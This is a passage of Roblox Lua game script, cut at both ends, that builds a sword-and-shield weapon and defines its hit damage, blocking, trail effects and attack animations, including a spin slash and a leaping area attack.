	Tip6 = Part(Weapon, false, false, 0, 0, "Bright blue", 0.6, 0.6, 0.3)

	Weld(Tip4, Tip6, 0, -0.4, 0.85, MR(15), 0, 0)



	Blades = {}



	for i = 0, 180, 180 do

		for x = -20, 20, 40 do

			local lol = i-90

			local lol2 = math.abs(lol/480)

			local lol3 = x/90

			local Blade1 = Part(Weapon, false, false, 0, 0.3, BladeColor, 0.2, 3.5, 0.6)

			Instance.new("BlockMesh",Blade1).Scale = Vector3.new(0.2, 1, 0.99)

			local w = Weld(Tip4, Blade1, lol2, 0, -lol3, 0, 0, 0)

			w.C0 = CN(0, 1.7, 0) * CA(0, MR(i+x), 0)

			table.insert(Blades, Blade1)

		end

	end



	Tip7 = Part(Weapon, false, false, 0, 0.3, BladeColor, 0.3, 1.3, 0.7)

	Add.Mesh(Tip7, "http://www.roblox.com/asset/?id=9756362", 0.31, 1.4, 0.8)

	Weld(Tip4, Tip7, 0, -3.45, 0, 0, 0, 0)



	table.insert(Blades, Tip7)



	TH.Part1 = Handle



	Shield = Instance.new("Model")

	Shield.Name = "Shield"



	SHandle = Part(Weapon, false, false, 0, 0, "Really black", 0.2, 0.9, 0.4)

	SW.Part1 = SHandle



	for i = 65, 115, 25 do

		local STip1 = Part(Weapon, false, false, 0, 0, "Really black", 0.2, 0.5, 0.4)

		local w = Weld(SHandle, STip1, 0.8, 0, 0, 0, 0, 0)

		w.C0 = CN(-0.5, 0.2, 0) * CA(0, 0, MR(i))

	end



	for i = -65, -115, -25 do

		local STip1 = Part(Weapon, false, false, 0, 0, "Really black", 0.2, 0.5, 0.4)

		local w = Weld(SHandle, STip1, 0.8, 0, 0, 0, 0, 0)

		w.C0 = CN(-0.5, -0.2, 0) * CA(0, 0, MR(i))

	end



	SHandle2 = Part(Weapon, false, false, 0, 0, "Really black", 0.2, 0.9, 0.4)

	Weld(SHandle, SHandle2, 1, 0, 0, 0, 0, 0)



	ShieldMain = Part(Weapon, false, false, 0, 0, "Medium grey", 0.3, 3.5, 1.1)

	ShieldW = Weld(SHandle2, ShieldMain, 0, 0, 0, 0, 0, 0)

	ShieldW.C0 = CN(0, -0.2, 0) * CA(0, MR(-5), 0)



	STip1 = Part(Weapon, false, false, 0, 0, "Navy blue", 0.35, 0.4, 1.15)

	Weld(ShieldMain, STip1, 0, -1.75, 0, 0, 0, 0)



	STip2 = Part(Weapon, false, false, 0, 0, "Navy blue", 0.35, 0.4, 1.15)

	Weld(ShieldMain, STip2, 0, 1.75, 0, 0, 0, 0)



	for i = -15, 15, 30 do

		local ShieldPlate = Part(Weapon, false, false, 0, 0, "Medium grey", 0.3, 3.5, 1.1)

		local w = Weld(ShieldMain, ShieldPlate, 3.5, 0, 0, 0, 0, 0)

		w.C0 = CN(3.5, 0, 0) * CA(0, math.rad(i), 0)

		for x = -1.75, 1.75, 1.75*2 do

			local STip3 = Part(Weapon, false, false, 0, 0, "Navy blue", 0.35, 0.4, 1.15)

			Weld(ShieldPlate, STip3, 0, x, 0, 0, 0, 0)

		end

		local i2 = i/40

		local STip3 = Part(Weapon, false, false, 0, 0, "Navy blue", 0.35, 3.9, 0.4)

		Weld(ShieldPlate, STip3, 0, 0, -i2, 0, 0, 0)

	end



	Weapon.Parent = Mo

	Shield.Parent = Mo



	Mo.Parent = char



	function ShowDamage(Dmg, Par, Crit, block)

		local Pos = Par.CFrame * CN(0, 2.5, 0)

		local M = Instance.new("Model")

		local Loldmg = Dmg

		if Loldmg < 0 then

			Loldmg = 0

		end

		if tostring(Loldmg):sub(1,1) == "-" then

			Loldmg = tostring(Loldmg):sub(2)

		end

		M.Name = Loldmg

		local Col = "Bright red"

		if Crit then Col = "Bright yellow" elseif block then Col = "Bright blue" end

		local P = Part(M, false, false, 0, 0, Col, 0.8, 0.3, 0.8, true)

		P.CFrame = CN(Par.Position)

		P.Name = "Head"

		local BP = Add.BP(P)

		BP.position = Pos.p

		BP.maxForce = Vector3.new(math.huge, math.huge, math.huge)

		BP.P = 11000

		Add.BG(P)

		local H = hc:clone()

		H.Parent = M

		H.MaxHealth = 0

		H.Health = 0

		M.Parent = workspace

		Notime(function()

			wait(1.5)

			M:remove()

		end)

	end



	function Damage(P, Hum, dmg, crit, block)

		if Hum then

			if Hum.Health > 0 then

				local Damg = dmg

				if crit then

					Damg = dmg*CritMultiplier

				end

				Damg = math.ceil(((Damg+AddDamage)*AddDamageX)-0.5)

				Hum.Health = Hum.Health - Damg

				ShowDamage(Damg, P, crit, block)

			end

		end

	end



	function ShieldDamage(mode, blockval, blockpowerval, crit)

		if blockval and blockpowerval then

			local ShieldDmg = mode[3]+AddShield

			if crit then

				ShieldDmg = mode[4]+AddShield

			end

			if blockpowerval then

				blockpowerval.Value = blockpowerval.Value - ShieldDmg

				if blockpowerval.Value < 1 then

					blockval.Value = false

				end

			end

		end

	end



	function getBlock(c)

		local block, blockpow = nil

		local blockin = false

		for _,v in pairs(c:children()) do

			if v.Name == "Block" and v:IsA("BoolValue") then

				block = v

				blockin = v.Value

				local bp = v:findFirstChild("BlockPower")

				if bp then

					blockpow = bp

				end

			end

		end

		return block, blockpow, blockin

	end



	function TouchDamage(hit)

		local Hum = getHumanoid(hit.Parent)

		if Hum and Deb and Hurt then

			Deb = false

			local Crit = false

			local BlockVal, BlockPowaVal, Blawk = getBlock(Hum.Parent)

			local BlockPowa = 0

			local blocksound = Sounds.SmashHit

			if math.random(1,100/CritChance) == 1 then

				Crit = true

			end

			local Damg = math.random(Mode[2]/3, Mode[2])

			if Blawk then

				Damg = 0

				ShieldDamage(Mode, BlockVal, BlockPowaVal, Crit)

				if BlockPowaVal then

					if BlockPowaVal.Value < 1 then

						blocksound = Sounds.Equip

					end

				end

			end

			if Mode[5] == false and RageMode == false and Blawk == false then

				Rage = Rage + math.ceil(Damg*0.75-0.5)

			end

			if Blawk then

				PlaySound(blocksound[1], blocksound[2]-0.15, blocksound[3])

			else

				PlaySound(Sounds.Hit[1], Sounds.Hit[2], Sounds.Hit[3])

			end

			Damage(hit, Hum, Damg, Crit, Blawk)

			if Mode == Dmgs.Spin then

				Notime(function()

					wait(0.35)

					Deb = true

				end)

			end

		end

	end



	for _, v in pairs(Blades) do

		v.Touched:connect(TouchDamage)

	end







	Bin = Instance.new("HopperBin", me.Backpack)



	EffectOn = false



	function StartEffect(color)

		EffectOn = true

		local lastPoint = Tip7.CFrame * EffPos.p

		Notime(function()

			while EffectOn do

				wait()

				local pos = Tip7.CFrame * EffPos.p

				local magn = (lastPoint - pos).magnitude

				local col = LineColor

				if color and col ~= EffectColor3 then

					col = color

				end

				local p = Part(workspace, true, false, 0.1, 0, col, 0.3, 1, 0.3, true)

				local mesh = Add.Head(p)

				mesh.Scale = Vector3.new(1, magn+0.1, 1)

				p.CFrame = CN(lastPoint, pos) * CA(-MP/2, 0, 0) * CN(0, magn/2+0.05, 0)

				lastPoint = pos

				Notime(function()

					wait(0.05)

					for i = 0, 1, 0.12 do

						p.Transparency = 0.1+0.9*i

						mesh.Scale = Vector3.new(1-1*i, magn+0.1-0.1*i, 1-1*i)

						wait()

					end

					p:remove()

				end)

			end

		end)

	end



	function EndEffect()

		EffectOn = false

	end



	function Detach()

		RAW.Part1 = nil

		LAW.Part1 = nil

		RLW.Part1 = nil

		LLW.Part1 = nil

		RAW.C0 = CN()

		LAW.C0 = CN()

		RLW.C0 = CN()

		LLW.C0 = CN()

	end



	function Normalize()

		RAW.C0 = CA(MR(40), MR(50), 0)

		LAW.C0 = CA(MR(20), MR(-20), MR(-20))

		HW.C0 = CA(0, 0, 0)

		neck.C0 = necko

	end



	SelectAnim = function()

		RAW.Part1 = Rarm

		HW.Part1 = nil

		TH.Part1 = Handle

		for i = 0.1, 1, 0.14 do

			RAW.C0 = CA(MR(220*i), MR(-30*i), MR(-35*i)) * CN(0.4*i, 0, 0)

			neck.C0 = necko * CA(MR(-10*i), 0, MR(-60*i))

			wait()

		end

		PlaySound(Sounds.Equip[1], Sounds.Equip[2], Sounds.Equip[3])

		HW.C0 = CN(0.4, 0, 0) * CA(MR(-60), MR(10), MR(100))

		HW.Part1 = Handle

		TH.Part1 = nil

		LAW.Part1 = Larm

		for i = 0.09, 1, 0.11 do

			RAW.C0 = CA(MR(220-70*i), MR(-30+25*i), MR(-35+70*i)) * CN(0.4-0.4*i, 0, 0)

			HW.C0 = CN(0.4-0.4*i, 0, 0) * CA(MR(-60+40*i), MR(10-10*i), MR(100-40*i))

			LAW.C0 = CA(MR(20*i), MR(-20*i), MR(-20*i))

			neck.C0 = necko * CA(MR(-10+10*i), 0, MR(-60+40*i))

			wait()

		end

		for i = 0.14, 1, 0.25 do

			RAW.C0 = CA(MR(150-60*i), MR(-5+15*i), MR(35-10*i))

			HW.C0 = CA(MR(-20+20*i), 0, MR(60-30*i))

			neck.C0 = necko * CA(0, 0, MR(-60+40+5*i))

			wait()

		end

		for i = 0.1, 1, 0.14 do

			RAW.C0 = CA(MR(90-50*i), MR(10+40*i), MR(25-25*i))

			HW.C0 = CA(0, 0, MR(30-30*i))

			neck.C0 = necko * CA(0, 0, MR(-15+15*i))

			wait()

		end

		Normalize()

	end



	DeselectAnim = function()

		for i = 0.09, 1, 0.14 do

			RAW.C0 = CA(MR(40+100*i), MR(50-50*i), MR(20*i))

			LAW.C0 = CA(MR(20-20*i), MR(-20+20*i), MR(-20+20*i))

			HW.C0 = CN(0.4*i, 0, 0) * CA(MR(-30*i), MR(5*i), MR(20*i))

			neck.C0 = necko * CA(MR(-5*i), 0, MR(-35*i))

			wait()

		end

		LAW.Part1 = nil

		for i = 0.08, 1, 0.14 do

			RAW.C0 = CA(MR(140+80*i), MR(-30*i), MR(20-55*i))

			HW.C0 = CN(0.4, 0, 0) * CA(MR(-30-30*i), MR(5+5*i), MR(20+80*i))

			neck.C0 = necko * CA(MR(-5-10*i), 0, MR(-35-25*i))

			wait()

		end

		HW.Part1 = nil

		TH.Part1 = Handle

		for i = 0.09, 1, 0.18 do

			RAW.C0 = CA(MR(220-220*i), MR(-30+30*i), MR(20-55+35*i))

			neck.C0 = necko * CA(MR(-5-10+15*i), 0, MR(-35-25+60*i))

			wait()

		end

		neck.C0 = necko

		Detach()

	end



	function setatk(s, e)

		Notime(function()

			Attack = e

			wait(0.25)

			Attack = s

		end)

	end



	Attacks = {

		function()

			Attack = 1

			Able = false

			for i = 0.1, 1, 0.2 do

				RAW.C0 = CA(MR(40+90*i), MR(50-60*i), 0)

				HW.C0 = CA(0, 0, 0)

				LAW.C0 = CA(MR(20+55*i), MR(-20), MR(-20+60*i))

				neck.C0 = necko * CA(MR(-10*i), 0, MR(-25*i))

				wait()

			end

			PlaySound(Sounds.Slash[1], Sounds.Slash[2], Sounds.Slash[3])

			for i = 0.16, 1, 0.33 do

				RAW.C0 = CA(MR(130+5*i), MR(-10-20*i), 0)

				HW.C0 = CA(0, 0, 0)

				LAW.C0 = CA(MR(75+5*i), MR(-20), MR(40+5*i))

				neck.C0 = necko * CA(MR(-10-5*i), 0, MR(-25-5*i))

				wait()

			end

			Hurt = true

			Deb = true

			StartEffect()

			Mode = Dmgs.Slash

			for i = 0.11, 1, 0.22 do

				RAW.C0 = CA(MR(135-115*i), MR(-30), MR(-50*i)) * CN(0, -0.7*i, 0)

				HW.C0 = CA(MR(-70*i), 0, 0)

				LAW.C0 = CA(MR(80-120*i), MR(-20+20*i), MR(45-45*i))

				neck.C0 = necko * CA(MR(-15+30*i), 0, MR(-30+45*i))

				wait()

			end

			EndEffect()

			Hurt = false

			setatk(1,2)

			Able = true

			for i = 0.2, 1, 0.25 do

				RAW.C0 = CA(MR(20-18*i), MR(-30), MR(-50-3*i)) * CN(0, -0.7-0.05*i, 0)

				HW.C0 = CA(MR(-70-5*i), 0, 0)

				neck.C0 = necko * CA(MR(15+3*i), 0, MR(15+3*i))

				wait()

			end

			wait(0.1)

			for i = 0.1, 1, 0.15 do

				if Able == false then return end

				RAW.C0 = CA(MR(2+38*i), MR(-30+80*i), MR(-53+53*i)) * CN(0, -0.75+0.75*i, 0)

				HW.C0 = CA(MR(-75+75*i), 0, 0)

				LAW.C0 = CA(MR(-40+60*i), MR(-20+20-20*i), MR(-20*i))

				neck.C0 = necko * CA(MR(15+3-18*i), 0, MR(15+3-18*i))

				wait()

			end

			Normalize()

		end,



		function()

			Attack = 2

			Able = false

			PlaySound(Sounds.Slash[1], Sounds.Slash[2]+0.1, Sounds.Slash[3])

			for i = 0.05, 1, 0.1 do

				RAW.C0 = CA(MR(10+80*i), MR(-30+30*i), MR(-55+35*i)) * CN(0, -0.75+0.35*i, 0)

				LAW.C0 = CA(MR(-40), 0, 0)

				HW.C0 = CA(MR(-75+75*i), 0, MR(90*i))

				neck.C0 = necko * CA(MR(18-13*i), 0, MR(18+22*i))

				wait()

			end

			Hurt = true

			Deb = true

			StartEffect()

			Mode = Dmgs.SideSlash

			for i = 0.09, 1, 0.17 do

				RAW.C0 = CA(MR(90-40*i), 0, MR(-20+110*i)) * CN(0, -0.4+0.4*i, 0)

				HW.C0 = CA(0, MR(-65*i), MR(90))

				LAW.C0 = CA(MR(-40+120*i), MR(-20*i), MR(50*i)) * CN(0, -0.6*i, 0)

				neck.C0 = necko * CA(MR(5), 0, MR(40-90*i))

				wait()

			end

			EndEffect()

			Hurt = false

			Deb = false

			setatk(1,3)

			Able = true

			for i = 0.12, 1, 0.25 do

				RAW.C0 = CA(MR(50-5*i), 0, MR(90+10*i))

				HW.C0 = CA(0, MR(-65-5*i), MR(90))

				LAW.C0 = CA(MR(-40+120), MR(-20), MR(50+5*i)) * CN(0, -0.6, 0)

				neck.C0 = necko * CA(MR(5), 0, MR(40-90-5*i))

				wait()

			end

			wait(0.08)

			for i = 0.05, 1, 0.1 do

				if Able == false then return end

				RAW.C0 = CA(MR(45-5*i), MR(50*i), MR(100-100*i)) * CN(0, 0, 0)

				HW.C0 = CA(0, MR(-70+70*i), MR(90-90*i))

				LAW.C0 = CA(MR(-40+120-60*i), MR(-20), MR(55-75*i)) * CN(0, -0.6+0.6*i, 0)

				neck.C0 = necko * CA(MR(5-5*i), 0, MR(-55+55*i))

				wait()

			end

			Normalize()

		end,



		function()

			Able = false

			for i = 0.05, 1, 0.08 do

				RAW.C0 = CA(MR(50+130*i), 0, MR(90-125*i)) * CN(0, -1*i, 0)

				HW.C0 = CA(0, MR(-65-35*i), MR(90-90*i))

				LAW.C0 = CA(MR(80+100*i), MR(-20+20*i), MR(50-15*i)) * CN(0, -0.6-0.4*i, 0)

				neck.C0 = necko * CA(MR(5-25*i), 0, MR(-50+50*i))

				wait()

			end

			PlaySound(Sounds.Slash[1], Sounds.Slash[2]+0.05, Sounds.Slash[3])

			for i = 0.13, 1, 0.25 do

				RAW.C0 = CA(MR(180+10*i), 0, MR(-35)) * CN(0, -1, 0)

				HW.C0 = CA(0, MR(-100), 0)

				LAW.C0 = CA(MR(180+10*i), 0, MR(35)) * CN(0, -1, 0)

				neck.C0 = necko * CA(MR(5-25-5*i), 0, 0)

				wait()

			end

			StartEffect()

			Hurt = true

			Deb = true

			Mode = Dmgs.Smash

			for i = 0.06, 1, 0.12 do

				RAW.C0 = CA(MR(190-160*i), 0, MR(-35)) * CN(0, -1+0.2*i, 0)

				HW.C0 = CA(MR(-20*i), MR(-100-40*i), MR(40*i))

				LAW.C0 = CA(MR(190-160*i), 0, MR(35)) * CN(0, -1+0.2*i, 0)

				neck.C0 = necko * CA(MR(-25+45*i), 0, 0)

				wait()

			end

			PlaySound(Sounds.SmashHit[1], Sounds.SmashHit[2], Sounds.SmashHit[3])

			EndEffect()

			Hurt = false

			Deb = false

			for i = 0.2, 1, 0.5 do

				RAW.C0 = CA(MR(30+15*i), 0, MR(-35)) * CN(0, -0.8+0.4*i, 0)

				HW.C0 = CA(MR(-20), MR(-140), MR(40))

				LAW.C0 = CA(MR(30+15*i), 0, MR(35)) * CN(0, -0.8+0.4*i, 0)

				neck.C0 = necko * CA(MR(20), 0, 0)

				wait()

			end

			setatk(1,4)

			Able = true

			for i = 0.16, 1, 0.33 do

				if not Able then return end

				RAW.C0 = CA(MR(30+15-15*i), 0, MR(-35)) * CN(0, -0.8+0.4-0.2*i, 0)

				HW.C0 = CA(MR(-20), MR(-140), MR(40))

				LAW.C0 = CA(MR(30+15-15*i), 0, MR(35)) * CN(0, -0.8+0.4-0.2*i, 0)

				neck.C0 = necko * CA(MR(20), 0, 0)

				wait()

			end

			for i = 0.05, 1, 0.1 do

				if not Able then return end

				RAW.C0 = CA(MR(30+10*i), MR(50*i), MR(-35+35*i)) * CN(0, -0.8+0.4-0.2+0.6*i, 0)

				HW.C0 = CA(MR(-20+20*i), MR(-140+140*i), MR(40-40*i))

				LAW.C0 = CA(MR(30+15-15-10*i), MR(-20*i), MR(35-55*i)) * CN(0, -0.8+0.4-0.2+0.6*i, 0)

				neck.C0 = necko * CA(MR(20-20*i), 0, 0)

				wait()

			end

			Normalize()

		end,

		function()

			Able = false

			for i = 0.06, 1, 0.12 do

				RAW.C0 = CA(MR(30), MR(-20*i), MR(-35-25*i)) * CN(0, -0.8, 0)

				HW.C0 = CA(MR(-20-60*i), MR(-140-40*i), MR(40-40*i))

				LAW.C0 = CA(MR(30-110*i), 0, MR(35-35*i)) * CN(0, -0.8+0.8*i, 0)

				neck.C0 = necko * CA(MR(20-15*i), 0, MR(10*i))

				wait()

			end

			Mode = Dmgs.DoubleSlash

			StartEffect()

			playz(Sounds.Slash)

			Hurt = true

			Deb = true

			for i = 0.07, 1, 0.14 do

				RAW.C0 = CA(MR(30+120*i), MR(-20), MR(-60+80*i)) * CN(0, -0.8+0.8*i, 0)

				HW.C0 = CA(MR(-80+60*i), MR(180), 0)

				LAW.C0 = CA(MR(-50+100*i), 0, MR(30*i))

				neck.C0 = necko * CA(MR(5-25*i), 0, MR(10-30*i))

				wait()

			end

			EndEffect()

			Hurt = false

			for i = 0.17, 1, 0.33 do

				RAW.C0 = CA(MR(150+15*i), MR(-20), MR(20+5*i))

				HW.C0 = CA(MR(-20), MR(180), 0)

				LAW.C0 = CA(MR(50+5*i), 0, MR(30+10*i))

				neck.C0 = necko * CA(MR(-20-5*i), 0, MR(-20))

				wait()

			end

			for i = 0.13, 1, 0.25 do

				RAW.C0 = CA(MR(165-15*i), MR(-20+50*i), MR(25-75*i))

				HW.C0 = CA(MR(-20-20*i), MR(180), 0)

				LAW.C0 = CA(MR(55+45*i), 0, MR(40-30*i))

				neck.C0 = necko * CA(MR(-25), 0, MR(-20+35*i))

				wait()

			end

			StartEffect()

			Hurt = true

			Deb = true

			playz(Sounds.Slash)

			for i = 0.08, 1, 0.16 do

				RAW.C0 = CA(MR(150-110*i), MR(30), MR(-50+65*i))

				HW.C0 = CA(MR(-40-40*i), MR(180), 0)

				LAW.C0 = CA(MR(100-50*i), MR(-30*i), MR(10+30*i)) * CN(0, -1.1*i, 0)

				neck.C0 = necko * CA(MR(-25+45*i), 0, MR(15-30*i))

				wait()

			end

			EndEffect()

			Hurt = false

			for i = 0.13, 1, 0.25 do

				RAW.C0 = CA(MR(40-5*i), MR(30), MR(15+5*i))

				HW.C0 = CA(MR(-80-5*i), MR(180), 0)

				LAW.C0 = CA(MR(50), MR(-30), MR(40)) * CN(0, -1.1-0.1*i, 0)

				neck.C0 = necko * CA(MR(20+5*i), 0, MR(-15-5*i))

				wait()

			end

			for i = 0.09, 1, 0.16 do

				RAW.C0 = CA(MR(35+5*i), MR(30+20*i), MR(20-20*i))

				HW.C0 = CA(MR(-85+85*i), MR(180+180*i), 0)

				LAW.C0 = CA(MR(50-30*i), MR(-30+10*i), MR(40-60*i)) * CN(0, -1.2+1.2*i, 0)

				neck.C0 = necko * CA(MR(25-25*i), 0, MR(-20+20*i))

				wait()

			end

			Normalize()

			Able = true

			Attack = 1

		end

	}



	SpinSlash = function(plaic)

		if Rage < Dmgs.Spin[6] then return end

		Rage = Rage - Dmgs.Spin[6]

		local cf = torso.CFrame

		local CF = ComputePos(cf.p, cf * CN(0, 0, -2))

		if plaic then

			CF = ComputePos(cf.p, plaic)

		end

		AbleAll = false

		local bg = Add.BG(torso)

		bg.cframe = CF

		for i = 0.07, 1, 0.14 do

			RAW.C0 = CA(MR(40+50*i), MR(50-65*i), 0)

			HW.C0 = CA(0, 0, MR(90*i))

			LAW.C0 = CA(MR(20-20*i), MR(-20+20*i), MR(-20-60*i))

			neck.C0 = necko * CA(0, 0, MR(-30*i))

			bg.cframe = CF * CA(0, MR(30*i), 0)

			wait()

		end

		StartEffect()

		Hurt = true

		Deb = true

		Mode = Dmgs.Spin

		Notime(function()

			while Hurt do

				PlaySound(Sounds.Slash[1], Sounds.Slash[2]+0.35, Sounds.Slash[3])

				wait(0.15)

			end

		end)

		for i = 0.04, 1, 0.06 do

			RAW.C0 = CA(MR(90-10*i), MR(-15), MR(90*i))

			HW.C0 = CA(0, MR(-70*i), MR(90))

			LAW.C0 = CA(MR(90*i), 0, MR(-20-60+120*i)) * CN(0, -0.7*i, 0)

			neck.C0 = necko * CA(0, 0, MR(-30+20*i))

			bg.cframe = CF * CA(0, MR(30-380*i), 0)

			wait()

		end

		EndEffect()

		for i = 0.09, 1, 0.17 do

			RAW.C0 = CA(MR(80), MR(-15), MR(90))

			HW.C0 = CA(0, MR(-70-10*i), MR(90))

			LAW.C0 = CA(MR(90), 0, MR(-20-60+120+20*i)) * CN(0, -0.7, 0)

			neck.C0 = necko * CA(0, 0, MR(-10+60*i))

			bg.cframe = CF * CA(0, MR(-350-60*i), 0)

			wait()

		end

		Hurt = false

		Deb = false

		for i = 0.05, 1, 0.1 do

			RAW.C0 = CA(MR(80-40*i), MR(-15+65*i), MR(90-90*i))

			HW.C0 = CA(0, MR(-80+80*i), MR(90-90*i))

			LAW.C0 = CA(MR(90-70*i), MR(-20*i), MR(60-80*i)) * CN(0, -0.7+0.7*i, 0)

			neck.C0 = necko * CA(0, 0, MR(-10+60-50*i))

			bg.cframe = CF * CA(0, MR(-410+50*i), 0)

			wait()

		end

		bg:remove()

		Normalize()

		AbleAll = true

	end



	Flawp = function(plaic)

		local cf = torso.CFrame

		local CF = ComputePos(cf.p, cf * CN(0, 0, -2))

		if plaic then

			CF = ComputePos(cf.p, plaic)

		end

		local cf2 = CF * CN(0, -1.1, -1)

		local Dist = 8

		local Hit1, Pos1 = RayC(CF.p, (CF * CN(0, -1, 0)).p, 4, char)

		local Hit2, Pos2 = RayC((CF * CN(0, 0, -Dist*2)).p, (CF * CN(0, -1, -Dist*2)).p, 4, char)

		local Hit3, Pos3 = RayC(CF.p, (CF * CN(0, 0, -Dist*2)).p, Dist*2, char)

		if Rage < Dmgs.Boom[6] then return end

		if Hit1 and Hit2 then

			Rage = Rage - Dmgs.Boom[6]

			local bp = Add.BP(torso)

			bp.position = cf.p

			local bg = Add.BG(torso)

			bg.cframe = CF

			AbleAll = false

			RLW.Part1 = Rleg

			LLW.Part1 = Lleg

			for i = 0.05, 1, 0.1 do

				RAW.C0 = CA(MR(40+30*i), MR(50-50*i), MR(25*i))

				LAW.C0 = CA(MR(20+50*i), MR(-20+20*i), MR(-20-5*i))

				HW.C0 = CA(MR(25*i), 0, 0)

				RLW.C0 = CN(0, 1*i, -1*i)

				LLW.C0 = CA(MR(-90*i), 0, 0) * CN(0, 0.5*i, -0.2*i)

				neck.C0 = necko * CA(MR(20*i), 0, 0)

				bp.position = CF * CN(0, -1*i, -1*i).p

				wait()

			end

			local Center = cf2 * CN(0, 0, -Dist)

			hum.PlatformStand = true

			PlaySound(Sounds.Jump[1], Sounds.Jump[2], Sounds.Jump[3])

			for i = 0.06, 1, 0.1 do

				RAW.C0 = CA(MR(70-160*i), 0, MR(25+15*i))

				LAW.C0 = CA(MR(70-160*i), 0, MR(-25-15*i))

				HW.C0 = CA(MR(25), 0, 0)

				RLW.C0 = CN(0, 1-1*i, -1+1*i)

				LLW.C0 = CA(MR(-90+70*i), 0, 0) * CN(0, 0.5+0.7*i, -0.2-0.3*i)

				neck.C0 = necko * CA(MR(20-50*i), 0, 0)

				bp.position = Center * CA(MR(180-45*i), 0, 0) * CN(0, 0, -Dist).p

				bg.cframe = CF * CA(MR(-90*i), 0, 0)

				wait()

			end

			for i = 0.06, 1, 0.1 do

				RAW.C0 = CA(MR(-90-90*i), 0, MR(40+50*i))

				LAW.C0 = CA(MR(-90-90*i), 0, MR(-40-50*i))

				HW.C0 = CA(MR(25-25*i), 0, MR(-90*i))

				RLW.C0 = CN(0, 0, 0)

				LLW.C0 = CA(MR(-20+20*i), 0, 0) * CN(0, 1.2-1.2*i, -0.5+0.5*i)

				bp.position = Center * CA(MR(135-45*i), 0, 0) * CN(0, 0, -Dist).p

				bg.cframe = CF * CA(MR(-90-90*i), 0, 0)

				wait()

			end

			StartEffect()

			for i = 0.06, 1, 0.1 do

				RAW.C0 = CA(MR(180+10*i), 0, MR(90-130*i)) * CN(0, -1*i, 0)

				LAW.C0 = CA(MR(180+10*i), 0, MR(-90+130*i)) * CN(0, -1*i, 0)

				HW.C0 = CA(0, 0, MR(-90-90*i))

				RLW.C0 = CN(0, 0, 0)

				LLW.C0 = CA(0, 0, 0) * CN(0, 0, 0)

				bp.position = Center * CA(MR(90-45*i), 0, 0) * CN(0, 0, -Dist).p

				bg.cframe = CF * CA(MR(-180-90*i), 0, 0)

				wait()

			end

			playz(Sounds.Slash)

			for i = 0.06, 1, 0.1 do

				RAW.C0 = CA(MR(190-100*i), 0, MR(-40)) * CN(0, -1-0.2*i, 0)

				LAW.C0 = CA(MR(190-80*i), MR(-25*i), MR(40-15*i)) * CN(0, -1-0.2*i, 0)

				HW.C0 = CA(0, MR(-45*i), MR(-180))

				RLW.C0 = CN(0, 1*i, -1*i)

				LLW.C0 = CA(MR(-20-70*i), 0, 0) * CN(0, 1.2-0.7*i, -0.5+0.3*i)

				neck.C0 = necko * CA(MR(-30+60*i), 0, 0)

				bp.position = Center * CA(MR(45-45*i), 0, 0) * CN(0, 0, -Dist).p

				bg.cframe = CF * CA(MR(-270-90*i), 0, 0)

				wait()

			end

			Mode = Dmgs.Boom

			EndEffect()

			RAW.C0 = CA(MR(90), 0, MR(-40)) * CN(0, -1.2, 0)

			LAW.C0 = CA(MR(110), MR(-25), MR(25)) * CN(0, -1.2, 0)

			HW.C0 = CA(0, MR(-45), MR(-180))

			RLW.C0 = CN(0, 1, -1)

			LLW.C0 = CA(MR(-90), 0, 0) * CN(0, 0.5, -0.2)

			bp.position = Center * CN(0, 0, -Dist).p

			bg.cframe = CF * CA(0, 0, 0)

			local PosEff = Center * CN(0, -2, -Dist-2.5)

			Notime(function()

				playz(Sounds.Boom)

				local disst = Dmgs.Boom[7]

				local chars = getCharacters(workspace, PosEff.p, disst)

				for _,v in pairs(chars) do

					local c, t, h = v[1], v[2], v[3]

					local d = (t.Position - PosEff.p).magnitude

					local bl, bp, blo = getBlock(c)

					if blo then

						ShieldDamage(Dmgs.Boom, bl, bp, false)

					end

					d = d/4

					if d < 1 then d = 1 end

					Damage(t, h, Dmgs.Boom[2]/d, false, false)

					for _,k in pairs(c:children()) do

						if k:IsA("BasePart") then

							k.Velocity = CFrame.new(PosEff.p, k.Position).lookVector * 40 + Vector3.new(0, 50, 0)

						end

					end

					h.PlatformStand = true

					Notime(function() h.PlatformStand = false end, 0.2)

				end

				local eff = Instance.new("Model",workspace)

				eff.Name = "Effect"

				local wave = Part(eff, true, false, 0, 0, EffectColor, 1, 1, 1, true)

				wave.CFrame = PosEff

				local wavem = Add.Mesh(wave, "http://www.roblox.com/asset/?id=20329976", 3, 2, 3)

				local ball = Part(eff, true, false, 0, 0, EffectColor2, 1, 1, 1, true)

				ball.CFrame = PosEff

				local ballm = Add.Sphere(ball)

				ballm.Scale = Vector3.new(2, 5, 2)

				local diamond = Part(eff, true, false, 0, 0, EffectColor, 1, 1, 1, true)

				diamond.CFrame = PosEff

				local diamondm = Add.Mesh(diamond, "http://www.roblox.com/asset/?id=9756362", 7, 0.5, 7)

				for i = 0, 1, 0.05 do

					wait()

					wave.CFrame = PosEff * CFrame.Angles(0, MR(180*i), 0)

					wave.Transparency = i

					wavem.Scale = Vector3.new(3+(disst*1.15)*i, 2+(disst/1.4)*i, 3+(disst*1.15)*i)

					ball.Transparency = i

					ballm.Scale = Vector3.new(1+(disst*2)*i, 5+(disst*1.2)*i, 1+(disst*2)*i)

					diamond.Transparency = i

					diamondm.Scale = Vector3.new(7-6.5*i, 0.5+(disst*2)*i, 7-6.5*i)

				end

				wait()

				eff:remove()

			end)

			wait(0.4)

			for i = 0.07, 1, 0.1 do

				RAW.C0 = CA(MR(90+50*i), 0, MR(-40)) * CN(0, -1.2+0.4*i, -0.4*i)

				LAW.C0 = CA(MR(110+30*i), MR(-25+25*i), MR(25+15*i)) * CN(0, -1.2+0.4*i, -0.4*i)

				HW.C0 = CA(MR(-30*i), MR(-45+45*i), MR(-180-30*i)) * CN(0, -0.7*i, 0)

				RLW.C0 = CN(0, 1-1*i, -1+1*i)

				LLW.C0 = CA(MR(-90+90*i), 0, 0) * CN(0, 0.5-0.5*i, -0.2+0.2*i)

				neck.C0 = necko * CA(MR(30-15*i), 0, 0)

				bp.position = Center * CN(0, 1.4*i, -Dist-1*i).p

				wait()

			end

			bp:remove()

			bg:remove()

			hum.PlatformStand = false

			for i = 0.05, 1, 0.1 do

				RAW.C0 = CA(MR(140-100*i), MR(50*i), MR(-40+40*i)) * CN(0, -0.8+0.8*i, -0.4+0.4*i)

				LAW.C0 = CA(MR(140-190*i), 0, MR(40-80*i)) * CN(0, -0.8+0.8*i, -0.4+0.4*i)

				HW.C0 = CA(MR(-30+30*i), 0, MR(-210-150*i)) * CN(0, -0.7+0.7*i, 0)

				RLW.C0 = CN()

				LLW.C0 = CN()

